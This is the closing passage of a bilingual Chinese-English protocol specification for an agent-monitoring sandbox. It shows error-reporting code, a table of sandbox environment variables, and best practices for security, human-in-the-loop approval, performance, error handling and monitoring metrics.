    agent.run()
except Exception as e:
    plugin.report_error({
        "category": "runtime",
        "code": "ERR_AGENT_CRASH",
        "message": str(e),
        "recoverable": False
    })
    raise
finally:
    plugin.report_exit(exit_code=0, reason="normal")

atexit.register(lambda: plugin.report_exit(0, "normal"))
```

### 13.2 环境变量

沙盒内部需要以下环境变量：

| 变量 | 说明 | 默认值 |
|------|------|--------|
| `PADDOCK_SESSION_ID` | 唯一 session 标识符 | （必需） |
| `PADDOCK_CONTROL_URL` | Control Plane URL | `http://host.docker.internal:3100` |
| `PADDOCK_SIDECAR_URL` | Sidecar URL | `http://localhost:8801` |
| `PADDOCK_WATCH_DIR` | 工作区目录 | `/workspace` |
| `PADDOCK_AGENT_NAME` | 用于日志的 Agent 名称 | `openclaw` |
| `PADDOCK_AGENT_PROCESS` | 用于存活检测的进程匹配模式 | `openclaw` |

---

## 14. 最佳实践

### 14.1 安全

- **永远不要在 Agent 代码里硬编码 API key**，请使用 LLM Proxy
- **使用 `/workspace`** 作为根目录，并校验所有文件路径
- **阻止路径中的 `..`**，使用对符号链接安全的路径解析
- **从严格的 HITL 策略开始**，基于观测到的行为逐步放宽
- **定期复盘 HITL 日志**，根据真实事件更新策略

### 14.2 性能

- 污点追踪器：限制为 **500 条 entry**
- 与 Control Plane 通信使用连接池
- 使用 correlation ID 对相关事件进行分组

### 14.3 错误处理

- **正确分类错误**：config、network、auth、resource、runtime、dependency
- **在可能时标记 recoverable**，Dashboard 会据此展示不同 UI
- **附带调试上下文**：provider 名称、状态码、耗时等
- **退出前先上报 fatal error**，这样 Dashboard 才能显示崩溃信息
- **对瞬时网络错误使用指数退避**（3 次尝试）

### 14.4 监控

**建议关注的关键指标：**

- 事件吞吐量（events/sec）
- HITL 审批率
- Agent 错误率
- LLM Proxy 成功率
- 信任分布

---

**AMP 协议规范 v1.0 结束**
